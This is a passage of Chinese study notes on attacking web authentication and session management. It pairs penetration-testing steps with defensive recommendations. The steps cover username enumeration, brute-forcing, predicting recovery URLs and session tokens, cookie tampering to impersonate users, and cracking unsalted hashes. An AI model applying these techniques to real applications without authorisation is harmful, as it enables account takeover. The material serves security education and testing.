<li>有些开发者会将密码保存在 cookie 中，此时攻击者可以通过访问客户端的本地文件系统来获得密码；即使密码被加密也没有关系，直接放入 cookie 中就可以用了；</li>
</ul>
<p>有些应用程序在加载第一个页面时没有使用 HTTPS，而是等到了传输密码时，才使用 HTTPS，这样是有安全隐患的，即用户无法保证第一个加载到的页面是真实的；</p>
<blockquote>
<h4 id="渗透测试步骤-13"><a href="#渗透测试步骤-13" class="headerlink" title="渗透测试步骤"></a>渗透测试步骤</h4><ul>
<li>进行一次成功登录，监控客户端与服务器之间的所有来回流量；</li>
<li>确定在来回方向传输密码的每一种情况，可通过设置拦截规则，标记包含特殊字符串的信息；</li>
<li>如果发现客户端通过 URL 查询字符串或cookie提交密码，或者由服务端向客户端传输密码，则需要了解其这样做的目的；</li>
<li>查看是否通过非加密渠道传输任何敏感信息；</li>
<li>如果没有发现不安全传输密码的情况，留意任何明显或模糊处理的数据，如果这些数据中包括敏感数据，则可能逆向工程其模糊算法；</li>
<li>例如使用 HTTPS 提交密码，但使用 HTTP 加载登录表单，则有机会使用中间人攻击，通过钓鱼获取密码；</li>
</ul>
</blockquote>
<h3 id="密码修改功能"><a href="#密码修改功能" class="headerlink" title="密码修改功能"></a>密码修改功能</h3><p>很多 Web 应用程序的密码修改功能经常不需要验证就可以访问，并经常给攻击者提供一些重要的信息，例如：</p>
<ul>
<li>过于详细的错误消息，例如说明被请求的用户名是否有效；</li>
<li>允许攻击者无限制猜测现有密码字段；</li>
<li>在验证现有密码后，仅检查“新密码”与“确认新密码”字段的值是否相同，允许攻击者不需入侵即可成功确认现有密码是否正确；</li>
</ul>
<blockquote>
<h4 id="渗透测试步骤-14"><a href="#渗透测试步骤-14" class="headerlink" title="渗透测试步骤"></a>渗透测试步骤</h4><ul>
<li>发现和确定应用程序中的所有密码修改功能；有时候它可能是隐藏的；</li>
<li>使用无效的用户名、无效的现有密码及不匹配的“新密码”和“确认新密码”等值，向密码修改功能提交各种请求；</li>
<li>设法确定任何可用于用户名枚举或蛮力攻击的行为；</li>
</ul>
</blockquote>
<p>提示：有时候表面看起来可能没有用户名字段，但它很可能是放在隐藏表单字段中；如果表单字段中也没有，可以尝试使用跟登录功能相同的参数提交一个包含用户名的参数（它有时可以成功覆盖当前用户的用户名，获得向其他用户发起蛮力攻击的机会，即使在主登录页面可能实施不了这个攻击）；</p>
<h3 id="忘记密码功能"><a href="#忘记密码功能" class="headerlink" title="忘记密码功能"></a>忘记密码功能</h3><p>同密码修改功能一样，忘记密码功能经常也会引入枚举漏洞，原因如下：</p>
<ul>
<li>使用质询问题：通过社交网络或其他渠道，可能很容易获取这些质询的答案，它的答案范围比正常的密码范围要小得多；</li>
<li>没有为质询的回答次数进行限制；</li>
<li>使用密码暗示：由于普通用户缺少安全意识，留下的暗示经常相当于明示；另外还可以通过已存在的问题暗示库数据进行枚举破解；</li>
<li>通过质询后，告知旧密码；导致攻击者只要记下质询的答案，即使用户修改了密码后，仍然可以通过质询获得新密码；</li>
<li>通过质询后，跳转到一个无须验证的新会话，导致攻击者即使不知道密码，也马上可以使用该账户了；</li>
<li>通过质询后，将恢复的 URL 发送至质询过程中提供的邮箱，而不是早期注册时预留的邮箱；（有时候邮箱字段并不在界面上显示，而是放在一个隐藏的表单字段或cookie中）；</li>
<li>修改密码后没有给用户发通知，导致用户误以为自己修改了密码，然后重新设置密码，最终无法发现账户已经被攻破了；</li>
</ul>
<blockquote>
<h4 id="渗透测试步骤-15"><a href="#渗透测试步骤-15" class="headerlink" title="渗透测试步骤"></a>渗透测试步骤</h4><ul>
<li>确认应用程序中的所有忘记密码功能；即使公布的页面中没有这个链接，但很可能仍然有这个功能；</li>
<li>使用受控账户执行一次完整的密码恢复流程，了解其工作机制；</li>
<li>如果恢复机制使用了质询，确定一下是否是让用户自行设定质询和响应，如果是的话，则可以使用质询库来进行匹配；</li>
<li>如果恢复机制使用暗示，使用已公开的暗示库，选择那些最容易猜测的暗示进行攻击；</li>
<li>尽量找出忘记密码机制中任何可用于用户名枚举或蛮力攻击的行为；</li>
<li>如果应用程序使用发送恢复 URL 的机制，则收集尽可能多的这类 URL ，然后找出规律，预测向其他用户发布 URL 的模式（可使用分析会话令牌相同的技巧）；</li>
</ul>
</blockquote>
<h3 id="“记住我”功能"><a href="#“记住我”功能" class="headerlink" title="“记住我”功能"></a>“记住我”功能</h3><h4 id="常见漏洞"><a href="#常见漏洞" class="headerlink" title="常见漏洞"></a>常见漏洞</h4><ul>
<li>在 cookie 中存放用户名，然后服务端简单相信该 cookie，没有进行验证；</li>
<li>在 cookie 中存放的会话标识没加密，此时可以通过推断其他用户的会话标识进行登录尝试；</li>
<li>在 cookie 中存放的会话标识有加密，此时可以尝试通过跨脚点脚本的漏洞获取这些标识；</li>
</ul>
<blockquote>
<h4 id="渗透测试步骤-16"><a href="#渗透测试步骤-16" class="headerlink" title="渗透测试步骤"></a>渗透测试步骤</h4><ul>
<li>激活所有”记住我”功能，确定应用程序是否记住了用户名和密码，还是只记了用户名，之后仍然需要输入密码；如果是后者，则此功能可能没有太大的漏洞；</li>
<li>仔细检查 cookie 值以及其他在本地存储的数据，寻找其中可能标识出用户或明显包含可预测用户标识的数据；</li>
<li>即使其中保存的数据经过了加密或模糊处理，通过比较几个非常类似的用户或密码的结果，有可能可以找到逆向工程的机会；</li>
<li>尝试修改持久性 cookie 的值，让服务端认为有另外一名用户在客户端登录过；</li>
</ul>
</blockquote>
<h3 id="用户伪装功能"><a href="#用户伪装功能" class="headerlink" title="用户伪装功能"></a>用户伪装功能</h3><p>一些应用程序允许特权用户伪装成普通用户，然后以该用户的权限访问数据和执行操作，例如银行或电信客户，在获得用户的电话口头验证后，切换到用户账户权限进行操作；常见的设计缺陷如下：</p>
<ul>
<li>伪装功能可能通过“隐藏”的形式执行，且不受常规访问控制的管理，只要猜出 URL 即可访问使用；</li>
<li>服务端可能会信任当前有效 cookie 提交的任何数据，并切换到伪装账户的权限进行操作；</li>
<li>如果管理员也可以被伪装，则任何缺陷都可能导致垂直权限提升的漏洞，导致攻击不仅可以访问其他用户的数据，还可以控制整个应用程序；</li>
<li>有些伪装功能能够以“后门”密码（或者叫万能密码）进行执行；攻击者可以在实施标准攻击的过程中，通过枚举发现这个密码</li>
</ul>
<blockquote>
<h4 id="渗透测试步骤-17"><a href="#渗透测试步骤-17" class="headerlink" title="渗透测试步骤"></a>渗透测试步骤</h4><ul>
<li>确定应用程序中的所有伪装功能，即使公布的内容中没有明确的伪装功能链接；</li>
<li>尝试使用伪装功能伪装成其他用户；</li>
<li>设法操纵由伪装功能处理的用户提交的数据，尝试伪装成其他用户，特别留意任何不通过正常登录页面提交用户名的情况；</li>
<li>如果能够成功利用伪装功能，尝试伪装成任何已知的或猜测出的管理用户，以提交用户权限；</li>
<li>实施密码猜测攻击时，查看是否有用户使用多个有效密码，或者某个特殊的密码是否与几个用户名匹配；特别注意任何 “以 X 登录”的状态消息；用在蛮力攻击中获得的密码，以许多不同的用户登录，检查是否一切正常；</li>
</ul>
</blockquote>
<h3 id="密码确认不完善"><a href="#密码确认不完善" class="headerlink" title="密码确认不完善"></a>密码确认不完善</h3><p>应用程序对密码的要求会显著影响密码池的大小，攻击者通过对密码限制进行分析，可以删除密码库中不符合条件的密码，从而加快了枚举的速度；</p>
<blockquote>
<h4 id="渗透测试步骤-18"><a href="#渗透测试步骤-18" class="headerlink" title="渗透测试步骤"></a>渗透测试步骤</h4><ul>
<li>使用一个受控账户，尝试使用密码的各种变化形式进行登录，例如删除最后一个字符、改变字符大小写、删除任何特殊排版的字符，以了解完整的密码确认规则；</li>
<li>利用规则，调整自动攻击的配置，删除多余的密码，提高成功的效率；</li>
</ul>
</blockquote>
<h3 id="非唯一性用户名"><a href="#非唯一性用户名" class="headerlink" title="非唯一性用户名"></a>非唯一性用户名</h3><p>非唯一性用户名还是比较少见的，可以通过多次使用同一用户名注册，来判断是否有唯一性的限制；</p>
<p>如果存在唯一性的限制，则可以通过大量注册常见的用户名，来获取哪些用户名是有人在用的；</p>
<blockquote>
<h4 id="渗透测试步骤-19"><a href="#渗透测试步骤-19" class="headerlink" title="渗透测试步骤"></a>渗透测试步骤</h4><ul>
<li>如果应用程序允许自我注册，尝试用不同密码两次注册同一个用户名；</li>
<li>如果应用程序不允许用户名重复，则可以用常见的用户名反复注册，以找到已注册的用户名；</li>
<li>如果应用程序允许用户名重复，尝试使用相同的密码，注册两个相同用户名，看应用程序会如何反应；</li>
<li>如果报错，使用某个有效的用户名，则尝试使用一组常用密码多次注册该用户名，如果应用程序拒绝某个特殊的密码，则可以发现用户名的现有密码；</li>
<li>如果没有报错，使用指定的密码登录，看看出现了什么结果；此时需要在每个账户中保存不同的数据以进行区分，之后才能确定这种行为是否可以导致跨账户的权限；</li>
</ul>
</blockquote>
<h3 id="可预测的用户名"><a href="#可预测的用户名" class="headerlink" title="可预测的用户名"></a>可预测的用户名</h3><p>有些应用程序根据某种可以预测的顺序自动生成账户用户名，在找到规律后，即可以很快获得全部的有效用户名；</p>
<h3 id="可预测的初始密码"><a href="#可预测的初始密码" class="headerlink" title="可预测的初始密码"></a>可预测的初始密码</h3><p>一些应用程序一次性或大批量创建用户，并自动指定初始密码，然后分配给所有用户；</p>
<blockquote>
<p>渗透测试步骤</p>
<ul>
<li>设法获得几个连续的密码，看能否从中看出任何顺序规律；</li>
<li>如果有规律，根据规律，获取其他应用程序用户的密码；</li>
<li>如果密码看起来跟用户名关联，使用已知的用户名或猜测出的用户名，用推断出的密码尝试进行登录验证；</li>
<li>可以使用推断出的密码列表作为后续实施蛮力攻击的基础；</li>
</ul>
</blockquote>
<h3 id="密码分配不安全"><a href="#密码分配不安全" class="headerlink" title="密码分配不安全"></a>密码分配不安全</h3><p>由于人性懒惰，如果应用程序没有要求用户修改初始密码，则大部分用户都不会更改初始密码；</p>
<p>有些应用程序不分配密码，而是发送一个激活链接，用户点击后，开始设置初始密码；这个链接很可能存在某种规律，攻击者可以通过注册几个紧密相连的用户，来确定其中的规律；</p>
<p>有些应用程序更搞笑，在用户修改密码后，还会发一封邮件通知用户该新设置的密码是多少；</p>
<blockquote>
<h4 id="渗透测试步骤-20"><a href="#渗透测试步骤-20" class="headerlink" title="渗透测试步骤"></a>渗透测试步骤</h4><ul>
<li>获得一个新账户，如果应用程序没有要求在注册阶段设置密码，则需要弄清应用程序如何分配密码；</li>
<li>如果应用程序使用激活 URL，则尝试注册几个紧密相关的新账户，从中寻找 URL 存在的规律；找到规律后，尝试使用这些 URL 占领其他用户的账户；</li>
<li>尝试多次重复使用同一个激活 URL，看应用程序如何反应；如果被拒绝，则尝试输入多次的错误密码，将受控账户锁定，然后重复使用 URL，看是否可行；</li>
</ul>
</blockquote>
<h2 id="验证机制执行缺陷"><a href="#验证机制执行缺陷" class="headerlink" title="验证机制执行缺陷"></a>验证机制执行缺陷</h2><h3 id="故障开放登录机制"><a href="#故障开放登录机制" class="headerlink" title="故障开放登录机制"></a>故障开放登录机制</h3><p>当验证不通过时，服务端的处理可能存在缺陷，例如错误的用户密码仍然可以登录，只是没有完整的功能，这样会导致一些数据泄露；</p>
<blockquote>
<h4 id="渗透测试步骤-21"><a href="#渗透测试步骤-21" class="headerlink" title="渗透测试步骤"></a>渗透测试步骤</h4><ul>
<li>使用受控账户执行一次完整、有效的登录；使用拦截器记录提交的每一份数据，收到的每一个响应；</li>
<li>多次重复登录过程，以非常规方式修改提交的数据；包括：提交一个空字符串值、完全删除键值对、提交非常长和非常短的值、提交字符串代替数字或反过来、以相同和不同的值多次提高同一个数据项；</li>
<li>仔细检查服务器对每次畸形请求的响应，确定任何不同于基本情况的差异；</li>
<li>根据观察到的结果，调整测试过程；如果某个修改造成了行为的改变，设计将这个修改与其他修改进行组合，使应用程序的逻辑判断达到最大限度，以暴露其中可能存在的逻辑漏洞；</li>
</ul>
</blockquote>
<h3 id="多阶段登录机制中的缺陷"><a href="#多阶段登录机制中的缺陷" class="headerlink" title="多阶段登录机制中的缺陷"></a>多阶段登录机制中的缺陷</h3><p>多阶段本意是想提高安全性，但是容易出现逻辑缺陷；开发人员经常会做出一些潜在的危险假设，包括：</p>
<ul>
<li>应用程序认为访问第三阶段的用户已经完成了前两个阶段的认证；</li>
<li>应用程序可能会信任由第二阶段提交的数据，因为到达第二阶段表示通过了第一阶段的认证；</li>
<li>应用程序认为每个阶段的用户身份不变发生变化，因此并没有在每个阶段确认用户身份；</li>
</ul>
<blockquote>
<h4 id="渗透测试步骤-22"><a href="#渗透测试步骤-22" class="headerlink" title="渗透测试步骤"></a>渗透测试步骤</h4><ul>
<li>使用一个受控账户执行一次完整的多步骤登录，用拦截器记录提交的每一份数据；</li>
<li>检查是否不止一次收到某条信息，或者是否有信息被返回给客户端，并通过隐藏表单字段、cookie或者预先设置的 URL 参数重新提交；</li>
<li>使用各种畸形请求多次重复登录过程：包括：尝试按不同的顺序完成登录步骤、尝试直接进入任何特定的阶段从那里继续登录、尝试省略每个阶段并从下一阶段继续登录、发挥想象力想出开发者无法预料的方式访问不同的阶段；</li>
<li>如果有数据不止提交一次，尝试在另外一个阶段提交一个不同的值，看是否能够成功登录；有些数据在某个阶段得到确认后，随后就被应用程序所信任；在这种情况下，可先用一个用户名通过第一阶段，再使用另一个用户名登录第二个阶段；</li>
<li>特别注意任何通过客户端传送，但不需要用户直接输入的数据，应用程序很有可能使用它们来保存登录的进度状态并且信任这些数据；</li>
</ul>
</blockquote>
<p>有些登录机制在用户名和密码验证后，会提出一个随机私密问题，要求用户进行回答；但有时候存在两个设计漏洞：</p>
<ul>
<li>应用程序将问题细节放在隐藏字段中，而没有保留在服务器上，使得攻击者可以自动选择回答哪个问题；</li>
<li>应用程序没有记录用户回答错误的记录，因此攻击者有机会遍历所有问题，然后找一个可以回答的；</li>
</ul>
<blockquote>
<h4 id="渗透测试步骤-23"><a href="#渗透测试步骤-23" class="headerlink" title="渗透测试步骤"></a>渗透测试步骤</h4><ul>
<li>如果应用程序使用了随机问题，检查问题本身是否和回答一起请求，如果是的话，尝试改变问题并提交正确答案，看能否成功登录；</li>
<li>如果应用程序不允许攻击者提交任意问题，则使用同一个账户反复进入这个问题，枚举所有存在的问题；有时应用程序会使用持久性的 cookie 让问题保持不变，此时只需要改变 cookie 即可以绕过限制；</li>
</ul>
</blockquote>
<h3 id="不安全的密码存储"><a href="#不安全的密码存储" class="headerlink" title="不安全的密码存储"></a>不安全的密码存储</h3><p>应用程序常常以危险的方式将用户密码保存在数据库中，例如以明文存储；即使使用 MD5 或者 SHA-1 等算法进行散列处理，攻击者仍然可以在预先计算的散列值数据库查找观察到的散列；另外，由于应用程序使用的数据库账户需要随时读写这些密码，因此存在其他漏洞导致可以访问这些密码的风险；</p>
<blockquote>
<h4 id="渗透测试步骤-24"><a href="#渗透测试步骤-24" class="headerlink" title="渗透测试步骤"></a>渗透测试步骤</h4><ul>
<li>分析应用程序有所有与用户验证或维护有关的功能，如果发现服务端有返回用户的密码，则说明用户的密码是明文存储的，或者使用了某种可还原的加密形式保存密码；</li>
<li>如果发现应用程序中存在任意一种命令或执行查询的漏洞，则设法弄清楚应用程序将用户密码保存在数据库或文件系统中的什么位置；找到这些位置，弄清应用程序是否以非加密形式保存密码；如果以散列形式存储密码，则检查是否分配账户时常用或默认密码，以及未经过加盐处理的散列值；如果没有加盐，则可以查询在线散列数据库，以确定对应的明文密码值；</li>
</ul>
</blockquote>
<h2 id="保障验证机制的安全"><a href="#保障验证机制的安全" class="headerlink" title="保障验证机制的安全"></a>保障验证机制的安全</h2><p>不同的验证方案有不同的优缺点，在追求安全性的基础上，有时候需要牺牲功能、易用性和总成本等；因此，决策者需要在不同的方案和目标之间做好权衡，评估所付出的安全成本，是否能够被足够的收益所抵销；</p>
<h3 id="使用可靠的密码"><a href="#使用可靠的密码" class="headerlink" title="使用可靠的密码"></a>使用可靠的密码</h3><ul>
<li>强制执行适应的最小密码强度要求，包括最小长度、使用字母+数字+特殊字符，同时使用大小写，避免使用单词、名称和常见密码，避免使用用户名为密码，避免使用和以前的密码相似或相同的密码；</li>
<li>应使用唯一的用户名；</li>
<li>系统生成的任何用户名和密码应具有足够的随机性，不包含任何顺序，以便攻击者无法进行预测；</li>
<li>允许用户设置足够强大的密码，例如增加长度和特殊字符；</li>
</ul>
<h3 id="安全处理密码"><a href="#安全处理密码" class="headerlink" title="安全处理密码"></a>安全处理密码</h3><ul>
<li>使用不会造成泄露的方式创建、保存和传送所有密码；</li>
<li>使用 SSL 保护客户端和服务端之间的通信；</li>
<li>在加载登录表单页面即使用 HTTPS ，而不是在提交登录信息时，才切换到 HTTPS；</li>
<li>只使用 POST 请求向服务器传输密码，绝不将密码放在 URL 或者 cookie 中；绝不将密码返回给客户端；</li>
<li>不将密码的原始值保存在数据库中，使用强大的散列函数加盐后保存，以便攻击者即使获得密码后也无法还原；</li>
<li>客户的“记住我”功能仅限于记住用户名，不可用于记住密码；</li>
<li>要求用户定期修改密码；</li>
<li>如果需要给用户分配密码，则应该以尽可能安全的方式传输密码，并设置时间限制，同时要求用户在第一次登录时更改密码，并告知用户在初次使用后销毁原始通信记录；</li>
</ul>
<h3 id="正确确认密码"><a href="#正确确认密码" class="headerlink" title="正确确认密码"></a>正确确认密码</h3><ul>
<li>应确认完整的密码，不过滤、截短或修改任何密码；</li>
<li>应用程序需要在登录处理过程中捕获所有异常并处理异常，出现异常后，应当删除用于控制登录状态的所有会话和相关数据，并使当前会话失效，以便让攻击者的会话强制退出；</li>
<li>严格审查验证逻辑的伪代码和源代码，避免其中存在任何的逻辑漏洞；</li>
<li>如果应用程序存在伪装功能，应该严格限制这种功能，防止攻击者利用它获得未授权的访问；该功能不得公开访问，仅限于内部访问；对访问方式进行严格审核和控制；</li>
<li>对阶段登录进行严格控制，防止攻击破坏各个阶段的转换与关系；<ul>
<li>登录阶段的进度和上一阶段的结果应该只保存在服务端，绝不可以传送到客户端；</li>
<li>禁止用户多次提交一项登录信息；</li>
<li>禁止用户修改已经被收集或确认的数据；如果某个数据需要在各个阶段重复使用，应该保存在会话中进行引用；</li>
<li>每个登录阶段都应该先核实前面的阶段已经顺利完成，如果发现前面的阶段没有完成，应该将验证标记为恶意尝试；</li>
<li>为避免攻击者知悉是哪个阶段登录失败，即使用户无法完成前面的阶段，即使最初的用户名无效，应用程序也应该总是走完所有的登录阶段，之后再呈现登录失败的信息，同时不提供关于失败位置的任何信息；</li>
</ul>
</li>
<li>如果在登录过程中需要回答一个随机的问题，需要确保攻击者无法选择问题；<ul>
<li>如果已经向一个用户提出一个特定的问题，将该问题永久性的保存到用户资料中，确保每次该用户尝试登录时提出相同的问题，直到该用户正确回答了这个问题；（这种方式也是有漏洞，即攻击者可以利用这个机制来枚举有效的用户名，因为无效的用户名没有存储问题）；</li>
<li>如果向某个用户提出一个随机变化的质询，而问题应该保存在服务端，禁止保存到 HTML 的隐藏字段中，并根据保存的问题，核实用户提供的答案；</li>
</ul>
</li>
</ul>
<h3 id="防止信息泄露"><a href="#防止信息泄露" class="headerlink" title="防止信息泄露"></a>防止信息泄露</h3><ul>
<li>应用程序使用的各种验证机制不应泄露关于验证的参数信息，以便攻击者无法判断是哪项提交的数据出了问题；</li>
<li>使用一个统一的组件来负责响应所有的失败消息，确保失败消息总是呈现一致性，以避免攻击者利用不一致来获得信息；</li>
<li>如果应用程序使用账户锁定机制，则该机制可被利用来枚举有效的用户名；</li>
<li>如果应用程序支持自我注册，则该机制可被利用来枚举有效的用户名；因此应要求用户使用电子邮件进行注册，当用户注册后，发邮件到其邮箱，通知注册结果；如果用户已经注册过了，就在邮件中说明已注册，如果用户未注册，就在邮件中放上一个唯一的 URL 让用户继续完成余下的注册步骤；</li>
</ul>
<h3 id="阻止蛮力攻击"><a href="#阻止蛮力攻击" class="headerlink" title="阻止蛮力攻击"></a>阻止蛮力攻击</h3><ul>
<li>当用户失败超过一定次数后，可将账户冻结一定的时间，例如30分钟；这样做算是一个折中，避免非常规激活给用户增加太多的成本，也给攻击者增加成本；<ul>
<li>应用程序不得透露任何关于存在冻结的信息，仅仅是提示有这种可能性即可；</li>
<li>应用程序不得透露冻结的时间；</li>
<li>如果账户被冻结，应用程序不再检查用户密码，直接拒绝登录尝试；</li>
</ul>
</li>
<li>账户冻结措施不能万无一失，因为即使是5次的失败机会，也意味着攻击者有4次尝试不会引起锁定；</li>
<li>在需要验证的页面使用 CAPTCHA 质询，用来防止自动化的数据提交（不过现在也出现了很多破解 CAPTCHA 的工具，它只能用来提高攻击成本，吓退那些随意的攻击者）（有时候 CAPTCHA 的答案还会隐藏在表单字段中，使得攻击者不用解题即可以获得答案）；</li>
</ul>
<h3 id="防止滥用密码修改功能"><a href="#防止滥用密码修改功能" class="headerlink" title="防止滥用密码修改功能"></a>防止滥用密码修改功能</h3><ul>
<li>应用程序必须设计密码修改功能，以便让用户定期修改密码；</li>
<li>只能从已经通过验证的会话中访问该功能；</li>
<li>不应以任何形式直接提供用户名，如隐藏的表单字段或者 cookie；企业修改他人密码的为定为非法行为；</li>
<li>要求用户修改密码时同时输入现有密码，以避免会话劫持漏洞、跨站点脚本攻击等；</li>
<li>为防止错误，新密码应该要求用户输入两次；</li>
<li>当尝试失败时，应使用常规错误消息告知错误，不能泄露错误的原因，如果出现多次失败，应临时冻结该功能；</li>
<li>应使用非常规的方式，通知用户密码已经修改，并且在通知中不得包含新密码或旧密码的信息；</li>
</ul>
<h3 id="防止滥用账户恢复功能"><a href="#防止滥用账户恢复功能" class="headerlink" title="防止滥用账户恢复功能"></a>防止滥用账户恢复功能</h3><ul>
<li>通过电子邮件向用户发送一条唯一的、有时间限制的、无法猜测的随机性 URL 帮助用户重新控制账户；当用户恢复账户后，再发送一封电子邮件通知用户密码已经修改；在用户的新密码修改成功前，旧密码应保持有效；</li>
<li>绝对避免使用密码“暗示”之类的功能，因为很多用户自己设置的暗示跟明示差不多；</li>
</ul>
<h3 id="日志、监控与通知"><a href="#日志、监控与通知" class="headerlink" title="日志、监控与通知"></a>日志、监控与通知</h3><p>应用程序应在日志中记录所有与验证有关的事件，包括登录、退出、密码修改、密码重设、账户冻结与账户恢复，日志中应包含一切相关的细节（如用户名和 IP 地址），但不得记录任何机密信息（例如密码）；应用程序应为日志提供强有力的保护，以防止未授权的访问，因为它们是信息泄露的主要源头；</p>
<ul>
<li>当出现异常事件时，应用程序应进行实时警报和主动入侵防御；</li>
<li>应以非常规的方式通知用户任何重大的安全事件，例如在用户尝试修改密码后，向其发送邮件进行告知；</li>
<li>应以非常规的方式告知用户其上次登录的时间和位置，以及在那之后无效登录的次数，以便让用户知悉其账户很可能正在遭受蛮力攻击，保存其设置更加安全的密码；</li>
</ul>
<h2 id="小结-2"><a href="#小结-2" class="headerlink" title="小结"></a>小结</h2><p>验证功能是应用程序受攻击面中最重要的目标，匿名用户可以直接访问该功能，使得其很容易暴露在所有攻击者面前；现实的验证机制存在着大量的设计与执行缺陷，使用系统化的方法尝试各种攻击途径，即可以对这些缺陷发起全面有效的攻击；</p>
<p>许多时候，漏洞显得易见；另一方面，有些缺陷隐藏得很深，需要对登录过程的逻辑进行反复推敲和分析，才能发现并利用这些缺陷；</p>
<h1 id="7-攻击会话管理"><a href="#7-攻击会话管理" class="headerlink" title="7. 攻击会话管理"></a>7. 攻击会话管理</h1><h2 id="状态要求"><a href="#状态要求" class="headerlink" title="状态要求"></a>状态要求</h2><p>会话机制中存在两大类的漏洞：</p>
<ul>
<li>生成会话过程中的漏洞；</li>
<li>处理会话过程中的漏洞；</li>
</ul>
<blockquote>
<h4 id="渗透测试步骤-25"><a href="#渗透测试步骤-25" class="headerlink" title="渗透测试步骤"></a>渗透测试步骤</h4><ul>
<li>应用程序经常在多个地方使用会话，包括 cookie、 URL 参数、隐藏表单字段等，以适应不同功能的状态判断需要，避免只检查一个地方；</li>
<li>有时候由 Web 服务器生成的标准会话令牌只是例行动作，并不定表示它一定会被应用程序所使用；</li>
<li>当用户经过验证后，仔细检查客户端收到哪些新的数据项，一般来说，应用程序在此时建立新的会话令牌；</li>
<li>找一个确定需要使用会话令牌数据的页面，例如个人资料页，尝试性的删除某个疑似令牌的数据后提交请求，如果返回的页面出现变化，不再是原来的那个页面，则说明该数据很可能为会话令牌；</li>
</ul>
</blockquote>
<p>并不是每个应用程序都会使用会话，有也其他替代方案可以用来进行状态</p>
<ul>
<li>HTTP 验证：客户端在每次请求中，都在消息头中重复提交密码进行验证；</li>
<li>无会话机制：将用户的状态数据保存在客户端，由用户在下一次请求的时候提交这些状态数据，没有保存在服务端，这样服务端就没有必要使用会话机制维护状态了；如果使用这种方式的话，就需要使用一个比较大的对象来存放状态信息了；</li>
</ul>
<blockquote>
<h4 id="渗透测试步骤-26"><a href="#渗透测试步骤-26" class="headerlink" title="渗透测试步骤"></a>渗透测试步骤</h4><ul>
<li>用排查法进行测试，看是否存在疑似令牌的数据；</li>
<li>如果存在以下现象，则说明应用程序很可能将会话状态保存在客户端，包括：向客户端发送的令牌数据比较大（如大于等于100B）、应用程序对每个请求做出响应后，发布一个新的类似令牌、数据似乎被加密（无法辨识其结构）或包含签名（由于有意义的结构和几个字节的无意义二进制数据组成）、应用程序拒绝通过多个请求提交相同数据的做法；</li>
<li>如果应用程序不使用会话令牌管理状态，则本章的所有攻击手段都没有效果，需要寻找其他方向的漏洞来进行渗透；</li>
</ul>
</blockquote>
<h2 id="会话令牌生成过程中的薄弱环节"><a href="#会话令牌生成过程中的薄弱环节" class="headerlink" title="会话令牌生成过程中的薄弱环节"></a>会话令牌生成过程中的薄弱环节</h2><p>使用令牌的一些场景</p>
<ul>
<li>发送到用户注册的电子邮件地址的密码恢复令牌；</li>
<li>存放在隐藏表单字段中的令牌，用于防止跨站点脚本攻击；</li>
<li>用于一次性访问受保护资源的令牌；</li>
<li>“记住我”功能使用的永久令牌；</li>
<li>未启用验证功能的购物应用程序，让用户可检查当前订单状态的令牌；</li>
</ul>
<h3 id="令牌有一定的含义"><a href="#令牌有一定的含义" class="headerlink" title="令牌有一定的含义"></a>令牌有一定的含义</h3><p>有些应用程序没有随机生成令牌，而是基于用户的个人信息来生成令牌；而用户的信息字段呈现某种多样性，有数字、字符串、邮件等；为了让信息的传输符合 HTML 的标准，应用程序先对信息进行编码，例如十六进制、Base64 等，这种方式通常会表现出某种结构，例如通常以分隔符隔开；另外，不同部分很可能使用不同的编码方式；</p>
<p>结构化的令牌的组成成分常包括以下几项：</p>
<ul>
<li>账户用户名、用户姓名中的名和姓、用户的电子邮件地址、用户的角色；</li>
<li>应用程序用来区分账户的数字标识符；</li>
<li>日期时间截；</li>
<li>一个递增或可预测的数字；</li>
<li>客户端的 IP 地址；</li>
</ul>
<p>虽然结构化令牌经常包含很大的数据量，但并不是每个请求都会使用里面的全部数据，每个请求经常只使用其中的一两个数据项；</p>
<blockquote>
<h4 id="渗透测试步骤-27"><a href="#渗透测试步骤-27" class="headerlink" title="渗透测试步骤"></a>渗透测试步骤</h4><ul>
<li>从应用程序获取一个令牌，每次修改其中的一个字节，然后重新发送，观察应用程序是否仍然正常响应；如果是的话，说明所修改的部分并未在请求处理过程中发挥作用，可以在接下来的分析中将其排除在外，以减轻分析的负担，提高效率；</li>
<li>在不同的时间，以不同的用户登录，记录服务器发布的令牌数据；</li>
<li>如果允许自我注册，注册一些非常相近的用户名并登录，观察返回的令牌的区别；</li>
<li>如果在登录阶段，有提交一些与用户相关的数据，对其进行系统化的修改，并记录登录后收到的令牌；</li>
<li>对令牌进行分析，查找任何与用户名或其他用户可控制的数据相关的内容；</li>
<li>查找令牌中任何明显的编码或模糊处理方案；常用的方案有 XOR、十六进制、Base64 等；</li>
<li>当对令牌数据的逆向工程取得有意义的结果时，尝试看能否猜测出应用程序最近向其他用户发布的令牌，在一个使用令牌才能显示令牌的页面，发送大量的请求，对猜测结果进行测试；</li>
</ul>
</blockquote>
<h3 id="令牌可预测"><a href="#令牌可预测" class="headerlink" title="令牌可预测"></a>令牌可预测</h3><p>有时候令牌中并不包含任何与用户有关的数据，但是令牌的生成本身具有的一定的顺序规律性，因此可以尝试猜测其他可能存在的有效令牌，并发送大量请求进行验证；这种方法的成功率比较低，可能只有千分之一，但是由于可以使用自动化的工具，在短时间内发送大量的请求进行验证（例如验证响应的长度即可区分有效和无效的请求），因此它也能够在短时间内找到很多有效的令牌；</p>
<p>可预测的会话令牌通常源于三点：</p>
<ul>
<li>隐含序列；</li>
<li>时间依赖；</li>
<li>生成的数字随机性不强；</li>
</ul>
<h4 id="隐含序列"><a href="#隐含序列" class="headerlink" title="隐含序列"></a>隐含序列</h4><p>有时候序列并不是一眼就可以发现的，需要在第一轮的解码后，再做第二轮的算术处理<br>例如第二个值减去第一个值，之后就会暴露出其中隐藏的模式出来；</p>
<h4 id="时间依赖"><a href="#时间依赖" class="headerlink" title="时间依赖"></a>时间依赖</h4><p>有些令牌的生成跟时间有关（一般会呈现递增规律），虽然以毫秒进行计算得到的随机值很大，但是攻击者可以每隔一小段时间就获取令牌，当发现跳跃的时候，很可能是应用程序给一个刚登录的用户生成了令牌，由于攻击者拥有该跳跃前和跳跃后的令牌数据，因此可以大大缩小枚举的范围，通过不断发请求进行尝试，获得用户的有效令牌；攻击者可以使用这个方法一直枚举有效令牌，直至等到管理员登录，届时将直接获得管理员的权限；</p>
<h4 id="生成的数字随机性不强"><a href="#生成的数字随机性不强" class="headerlink" title="生成的数字随机性不强"></a>生成的数字随机性不强</h4><p>计算机生成的随机数基本上都是伪随机的，它其实是有规律的，差别在于开发者如何去除它的规律性，如果开发者使用成熟框架的默认函数，则去除的办法相当于被公开了，那么攻击者在获得一个令牌后，就可以推测出下一个令牌的值，甚至之前所有令牌的值；</p>
